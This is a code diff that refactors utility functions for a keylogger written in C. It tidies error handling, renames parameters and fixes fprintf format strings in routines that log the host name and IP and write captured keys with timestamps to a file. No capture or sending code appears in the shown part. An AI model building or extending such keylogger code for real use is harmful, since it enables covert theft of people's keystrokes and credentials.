@@ -1,8 +1,10 @@
 /**
- * Local keylogging
+ * Utilities that help the keylogger function.
  */
 
 #include "keylogger.h"
+
+#include "server_utils.h"
 
 // for keylogging
 #define _POSIX_SOURCE
@@ -27,34 +29,32 @@
 #include <time.h>
 #include <unistd.h>
 
-// this is an indicator for when to stop the keylogging loop. 0 = stop
+// tAn indicator for when to stop the keylogging loop. 0 = stop.
 int log_indicator = 1;
 
 void check_IP_buffer(char* IPbuffer) {
   if (NULL == IPbuffer) {
-    perror("inet_ntoa");
-    exit(1);
+    error_and_exit("IP buffer not initialized.");
   }
 }
 
-void log_device(key_package* key_package) {
-  char hostbuffer[256];
-  char* IPbuffer;
-  struct hostent* host_entry;
-  int hostname;
+void log_device(key_package* package) {
+  const int hostbuffer_size = 256;
+  char hostbuffer[hostbuffer_size];
+  char* IPbuffer = "";
+  struct hostent* host_entry = NULL;
+  int hostname = 0;
 
   // To retrieve hostname
   hostname = gethostname(hostbuffer, sizeof(hostbuffer));
   if (hostname == -1) {
-    perror("gethostname");
-    exit(1);
+    error_and_exit("Error retreiving host name.");
   }
 
   // To retrieve host information
   host_entry = gethostbyname(hostbuffer);
   if (host_entry == NULL) {
-    perror("gethostbyname");
-    exit(1);
+    error_and_exit("Error receiving host information.");
   }
 
   // To convert an Internet network
@@ -69,7 +69,7 @@ void log_device(key_package* key_package) {
   printf("Host IP: %s\n", IPbuffer);
 }
 
-void reset_structs(key_package* key_package) { key_package->keys_arr_size = 0; }
+void reset_structs(key_package* package) { package->keys_arr_size = 0; }
 
 void print_logged_keys(key_package package) {
   printf("All keys in key_package struct: \n");
@@ -83,13 +83,13 @@ void print_logged_keys(key_package package) {
 void keys_to_file(FILE* package_log, key_package package) {
   char* line = "";
   for (size_t i = 0; i < package.keys_arr_size; i++) {
-    fprintf(package_log, "Key:");
-    fprintf(package_log, package.keys[i].key);
-    fprintf(package_log, " Timestamp: ");
-    fprintf(package_log, package.keys[i].timestamp);
+    (void)fprintf(package_log, "Key:");
+    (void)fprintf(package_log, "%s", package.keys[i].key);
+    (void)fprintf(package_log, " Timestamp: ");
+    (void)fprintf(package_log, "%s", package.keys[i].timestamp);
 
-    fprintf(package_log, "\t");
+    (void)fprintf(package_log, "\t");
   }
 
-  fprintf(package_log, "\n");
+  (void)fprintf(package_log, "\n");
 }
